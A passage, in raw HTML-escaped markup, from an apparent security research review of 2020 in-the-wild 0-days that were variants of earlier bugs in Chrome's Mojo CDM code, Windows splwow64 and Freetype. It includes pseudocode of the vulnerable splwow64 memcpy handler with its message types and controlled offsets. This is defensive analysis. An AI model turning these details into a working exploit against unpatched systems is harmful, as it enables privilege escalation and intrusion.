c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;This vulnerability that was exploited in-the-wild was reported in April 2020. 7 months prior, in September 2019, Man Yue Mo of Semmle &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1004730"&gt;reported a very similar vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromereleases.googleblog.com/2019/10/stable-channel-update-for-desktop.html"&gt;CVE-2019-13695&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. CVE-2019-13695 is also a use-after-free on a dangling &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_context_&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c23"&gt;MojoAudioDecoderService&lt;/span&gt;&lt;span&gt;&amp;nbsp;after releasing the &lt;/span&gt;&lt;span class="c23"&gt;cdm_context_ref_&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;This vulnerability is essentially the same bug as CVE-2020-6572, it&amp;rsquo;s just triggered by an error path after initializing &lt;/span&gt;&lt;span class="c23"&gt;MojoAudioDecoderService&lt;/span&gt;&lt;span&gt;&amp;nbsp;twice rather than by reinitializing the &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In addition, in August 2019, Guang Gong of Alpha Team, Qihoo 360 reported another similar vulnerability in the same component. The &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=999311"&gt;vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is where the CDM could be registered twice (e.g. &lt;/span&gt;&lt;span class="c23"&gt;MojoCdmService::Initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;could be called twice) leading to use-after-free. When &lt;/span&gt;&lt;span class="c23"&gt;MojoCdmService::Initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;was called twice there would be two map entries in &lt;/span&gt;&lt;span class="c23"&gt;cdm_services_&lt;/span&gt;&lt;span&gt;, but only one would be removed upon destruction, and the other was left dangling. This vulnerability is &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromereleases.googleblog.com/2019/09/stable-channel-update-for-desktop.html"&gt;CVE-2019-5870&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Guang Gong used this vulnerability as a part of an Android exploit chain. He presented on this exploit chain at Blackhat USA 2020, &amp;ldquo;&lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf"&gt;TiYunZong: An Exploit Chain to Remotely Root Modern Android Devices&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;rdquo;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;While one could argue that the vulnerability from Guang Gong is not a variant of the vulnerability exploited in-the-wild, it was at the very least an early indicator that the Mojo CDM code for Android had life-cycle issues and needed a closer look. This &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=999311#c8"&gt;was noted in the issue tracker &lt;/a&gt;&lt;/span&gt;&lt;span&gt;for CVE-2019-5870 and then &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1004730#c1"&gt;brought up again&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;after Man Yue Mo reported CVE-2019-13695.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.ejffpv4bguza"&gt;&lt;span class="c33 c4"&gt;Windows splwow64 CVE-2020-0986&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0986"&gt;CVE-2020-0986&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an arbitrary pointer dereference in Windows splwow64. Splwow64 is executed any time a 32-bit application wants to &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;&amp;nbsp;a document. &lt;/span&gt;&lt;span&gt;It runs as a Medium integrity process. Internet Explorer runs as a 32-bit application and a Low integrity process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Internet Explorer can send LPC messages to splwow64. CVE-2020-0986 allows an attacker in the Internet Explorer process to control all three arguments to a &lt;/span&gt;&lt;span class="c23"&gt;memcpy&lt;/span&gt;&lt;span&gt;&amp;nbsp;call in the more privileged splwow64 address space. The only difference between CVE-2020-0986 and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-0880"&gt;CVE-2019-0880&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which was also exploited in-the-wild, is that CVE-2019-0880 exploited the &lt;/span&gt;&lt;span class="c23"&gt;memcpy&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;by sending message type 0x75 and CVE-2020-0986 exploits it by sending message type 0x6D. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;From this &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://byteraptors.github.io/windows/exploitation/2020/05/24/sandboxescape.html"&gt;great write-up from ByteRaptors&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;on CVE-2019-0880 the pseudo code that allows the controlling of the &lt;/span&gt;&lt;span class="c23"&gt;memcpy&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;is:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a6fa8b5c3c8ad2be97429c1d22237b810a735e00"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;GdiPrinterThunk&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;LPVOID firstAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;LPVOID secondAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;LPVOID thirdAddress&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(*((&lt;/span&gt;&lt;span class="c2"&gt;BYTE&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;firstAddress &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x4&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x75&lt;/span&gt;&lt;span class="c1"&gt;){&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ULONG64 memcpyDestinationAddress &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*((&lt;/span&gt;&lt;span class="c2"&gt;ULONG64&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;firstAddress &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x20&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;memcpyDestinationAddress &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;){&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ULONG64 sourceAddress &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*((&lt;/span&gt;&lt;span class="c2"&gt;ULONG64&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;firstAddress &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x18&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; DWORD copySize &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*((&lt;/span&gt;&lt;span class="c2"&gt;DWORD&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;firstAddress &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x28&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;memcpyDestinationAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;sourceAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;copySize&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;The equivalent pseudocode for CVE-2020-0986 is below. &lt;/span&gt;&lt;span&gt;Only the message type (0x75 to 0x6D) and the offsets of the controlled &lt;/span&gt;&lt;span class="c23"&gt;memcpy&lt;/span&gt;&lt;span&gt;&amp;nbsp;arguments changed&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;as highlighted below.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8dbc0fb11c95a5ee904cce1df18fa4f5f62d385d"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;GdiPrinterThunk&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;LPVOID msgSend&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;LPVOID msgReply&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;LPVOID arg3&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c15"&gt;if&lt;/span&gt;&lt;span class="c1 c15"&gt;(*((&lt;/span&gt;&lt;span class="c2 c15"&gt;BYTE&lt;/span&gt;&lt;span class="c1 c15"&gt;*)(&lt;/span&gt;&lt;span class="c2 c15"&gt;msgSend &lt;/span&gt;&lt;span class="c1 c15"&gt;+&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c15"&gt;0x4&lt;/span&gt;&lt;span class="c1 c15"&gt;))&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c15"&gt;==&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c15"&gt;0x6D&lt;/span&gt;&lt;span class="c1 c15"&gt;){&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;ULONG64 srcAddress &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**((&lt;/span&gt;&lt;span class="c2"&gt;ULONG64 &lt;/span&gt;&lt;span class="c1"&gt;**)(&lt;/span&gt;&lt;span class="c2"&gt;msgSend &lt;/span&gt;&lt;span class="c1 c15"&gt;+&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c15"&gt;0xA&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;span class="c2 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;srcAddress &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;){&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; DWORD copySize &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*((&lt;/span&gt;&lt;span class="c2"&gt;DWORD&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;msgSend &lt;/span&gt;&lt;span class="c1 c15"&gt;+&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c15"&gt;0x40&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;copySize &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0x1FFFE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ULONG64 destAddress &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*((&lt;/span&gt;&lt;span class="c2"&gt;ULONG64&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c2"&gt;msgSend &lt;/span&gt;&lt;span class="c1 c15"&gt;+&lt;/span&gt;&lt;span class="c2 c15"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c15"&gt;0xB&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;destAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;sourceAddress&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;copySize&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In addition to CVE-2020-0986 being a trivial variant of a previous in-the-wild vulnerability, CVE-2020-0986 was also not patched completely and the vulnerability was still exploitable even after the patch was applied. This is detailed in the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ldquo;&lt;/span&gt;&lt;span class="c11 c4"&gt;Exploited 0-days not properly fixed&amp;rdquo; section below.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c3 c36" id="h.3ecniw2v9hbz"&gt;&lt;span&gt;Freetype CVE-2020-15999&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In October 2020, Project Zero discovered multiple exploit chains being used in the wild. The exploit chains targeted iPhone, Android, and Windows users, but they all shared the same Freetype RCE to exploit the Chrome renderer, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html"&gt;CVE-2020-15999&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://savannah.nongnu.org/bugs/?59308"&gt;The vulnerability is a heap buffer overflow&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class="c23"&gt;Load_SBit_Png&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;function. The vulnerability was being triggered by an integer truncation. `Load_SBit_Png` processes PNG images embedded in fonts. The image width and height are stored in the PNG header as 32-bit integers. Freetype then truncated them to 16-bit integers. This truncated value was used to calculate the bitmap size and the backing buffer is allocated to that size. However, the original 32-bit width and height values of the bitmap are used when reading the bitmap into its backing buffer, thus causing the buffer overflow.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In November 2014, Project Zero team member &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=168"&gt;Mateusz Jurczyk reported CVE-2014-9665&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Freetype. CVE-2014-9665 is also a heap buffer overflow in the &lt;/span&gt;&lt;span class="c23"&gt;Load_SBit_Png&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. This one was triggered differently though. In CVE-2014-9665, when calculating the bitmap size, the size variable is vulnerable to an integer overflow causing the backing buffer to be too small. &lt;/span&gt;&lt;/p&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c25"&gt;&lt;span&gt;To patch CVE-2014-9665, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="http://git.savannah.gnu.org/cgit/freetype/freetype2.git/tree/src/sfnt/pngshim.c?id=54abd22891bd51ef8b533b24df53b3019b5cee81"&gt;Freetype added a check to the rows and width&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;prior to calculating the size as shown below.&lt;/span&gt;&lt;/p&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.544aaafdb3cb243b450aa049bcdb0901e282420f"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;populate_map_and_metrics &lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; FT_Long &amp;nbsp;size&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;FT_Int&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;imgWidth&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;height &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;FT_Int&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;imgHeight&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;rows &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;height&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;pixel_mode &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;FT_PIXEL_MODE_BGRA&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;pitch &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;num_grays 